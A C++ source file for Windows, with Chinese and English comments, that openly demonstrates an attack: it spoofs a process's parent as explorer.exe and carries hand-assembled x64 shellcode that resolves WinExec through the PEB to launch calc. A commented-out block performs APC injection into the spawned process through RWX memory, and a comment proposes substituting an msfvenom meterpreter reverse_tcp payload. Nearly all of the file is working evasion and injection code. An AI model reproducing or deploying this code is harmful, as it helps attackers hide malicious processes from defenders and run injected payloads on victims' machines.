#include <windows.h>
#include <TlHelp32.h>
#include <iostream>

DWORD getParentProcessID() { //返回explorer.exe的pid
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 process = { 0 };
    process.dwSize = sizeof(process);

    if (Process32First(snapshot, &process)) {
        do {
            //If you want to another process as parent change here
            if (!wcscmp(process.szExeFile, L"explorer.exe"))
                break;
        } while (Process32Next(snapshot, &process));
    }

    CloseHandle(snapshot);
    return process.th32ProcessID;
}

int main() {

    //Shellcode, for example; msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=x.x.x.x EXITFUNC=thread -f c
    unsigned char shellCode[] =
        //"\xcc"
        // Find kernel32.dll base address
        "\x48\x31\xC9"              // xor rcx, rcx
        "\x65\x48\x8B\x41\x60"      // mov rax, gs: [rcx + 0x60]    ; RAX = PEB
        "\x48\x8B\x40\x18"          // mov rax, [rax + 0x18]        ; RAX = PEB->Ldr
        "\x48\x8B\x70\x10"          // mov rsi, [rax + 0x10]        ; RSI = PEB->Ldr.InLoadOrder
        "\x48\xAD"                  // lodsq                        ; RAX = Second module (lodsq == mov rax,QWORD PTR [rsi])
        "\x48\x96"                  // xchg rax, rsi                ; RAX = RSI, RSI = RAX
        "\x48\xAD"                  // lodsq                        ; RAX = Third(kernel32)
        "\x48\x8B\x58\x30"          // mov rbx, [rax + 0x30]        ; RBX = Base address
        // Find the export table of kernel32.dll
        "\x48\x31\xD2"                      // xor rdx, rdx
        "\x4D\x31\xC0"                      // xor r8, r8
        "\x48\x31\xF6"                      // xor rsi, rsi
        "\x8B\x53\x3C"                      // mov edx, [rbx + 0x3c]        ; RDX = DOS->e_lfanew
        "\x49\x89\xD0"                      // mov r8, rdx
        "\x48\x31\xD2"                      // xor rdx, rdx
        "\x42\x8B\x94\x03\x88\x00\x00\x00"  // mov edx, [rbx + r8 + 0x88]   ; RDX = Offset export table
        "\x49\x89\xD0"                      // mov r8, rdx
        "\x48\x31\xD2"                      // xor rdx, rdx
        "\x42\x8B\x54\x03\x20"              // mov edx, [rbx + r8 + 0x20]   ; RDX = Offset names table
        "\x48\x31\xC9"                      // xor rcx, rcx                 ; RCX = 0

        "\x48\x31\xF6"                          // xor rsi, rsi
        "\x48\x31\xC0"                          // xor rax, rax
        "\x48\x89\xD0"                          // mov rax, rdx
        // Find GetProcAddress function name     
        // Get_Function:
        "\x8B\x34\x03"                          // mov esi, [rbx + rax]                         ; RSI = name offset
        "\x48\xFF\xC1"                          // inc rcx                                      ; Increment the ordinal
        "\x48\x83\xC0\x04"                      // add rax, 4                                    
        "\x81\x3C\x33\x57\x69\x6E\x45"          // cmp dword ptr[rbx + rsi], 0x456e6957         ; WinE
        "\x75\xED"                              // jnz Get_Function
        "\x81\x7C\x33\x03\x45\x78\x65\x63"      // cmp dword ptr[rbx + rsi + 0x3], 0x63657845   ; Exec  
        "\x75\xE3"                              // jnz Get_Function
        //"\xcc"

        "\x48\x31\xD2"                          // xor rdx, rdx
        "\x48\x31\xC0"                          // xor rax, rax
        "\x42\x8B\x54\x03\x1C"                  // mov edx, [rbx + r8 + 0x1C]   ; RDX = Offset function table
        "\x48\xFF\xC9"                          // dec rcx
        "\x48\xC1\xE1\x02"                      // shl rcx, 2
        "\x48\x01\xD1"                          // add rcx, rdx
        "\x8B\x04\x0B"                          // mov eax, [rbx + rcx]
        "\x48\x01\xD8"                          // add rax, rbx                 ; RAX = WinExec ptr
        //"\xcc"
        // WinExec("calc",1)
        "\x48\x31\xD2"					// xor rdx, rdx
        "\x48\x31\xC9"					// xor rcx, rcx
        //"\x48\xC7\xC1\x63\x6D\x64\x00"	// mov rcx, 0x646d63 ;cmd
        "\x48\xC7\xC1\x63\x61\x6c\x63"	// mov rcx, 0x636c6163 ;calc
        "\x51"							// push rcx
        "\x48\x89\xE1"					// mov rcx, rsp
        "\x48\xFF\xC2"					// inc rdx
        "\xFF\xD0"						// call rax
        //"\xcc"
        "\x00"
        ;



    STARTUPINFOEXA sInfoEX;
    PROCESS_INFORMATION pInfo;
    SIZE_T sizeT;
    BOOL bRes;

    DWORD PPID = getParentProcessID();
    printf("[+] fake parent PID: %d\n", PPID);
    HANDLE expHandle = OpenProcess(PROCESS_ALL_ACCESS, false, PPID); //打开explorer进程获取当前进程所有权限
    //HANDLE expHandle = OpenProcess(PROCESS_ALL_ACCESS, false, 2232); //打开explorer进程获取当前进程所有权限


    ZeroMemory(&sInfoEX, sizeof(STARTUPINFOEXA)); //用0填充数组
    bRes = InitializeProcThreadAttributeList(NULL, 1, 0, &sizeT); //初始化指定的属性列表以创建进程和线程
    if (!bRes) printf("[-] InitializeProcThreadAttributeList 1 failed\n");
    sInfoEX.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, sizeT); //设置进程属性并从堆中分配内存
   
    bRes = InitializeProcThreadAttributeList(sInfoEX.lpAttributeList, 1, 0, &sizeT);
    if (!bRes) printf("[-] InitializeProcThreadAttributeList 2 failed\n");

    bRes = UpdateProcThreadAttribute(sInfoEX.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &expHandle, sizeof(HANDLE), NULL, NULL); //更新用于进程和线程创建的属性列表中的指定属性。
    if (!bRes) printf("[-] UpdateProcThreadAttribute failed\n");
    sInfoEX.StartupInfo.cb = sizeof(STARTUPINFOEXA);

    CreateProcessA("C:\\Users\\Hank Chen\\Desktop\\SysinternalsSuite\\Autoruns64.exe", NULL, NULL, NULL, TRUE, 0, NULL, NULL, reinterpret_cast<LPSTARTUPINFOA>(&sInfoEX), &pInfo);

    /*
    LPVOID lpBaseAddress = (LPVOID)VirtualAllocEx(pInfo.hProcess, NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE); //分配内存
    SIZE_T* lpNumberOfBytesWritten = 0;
    BOOL resWPM = WriteProcessMemory(pInfo.hProcess, lpBaseAddress, (LPVOID)shellCode, sizeof(shellCode), lpNumberOfBytesWritten); //写入内存

    QueueUserAPC((PAPCFUNC)lpBaseAddress, pInfo.hThread, NULL); //APC调用
    ResumeThread(pInfo.hThread); //启动线程
    CloseHandle(pInfo.hThread); //关闭线程
    */

    return 0;
}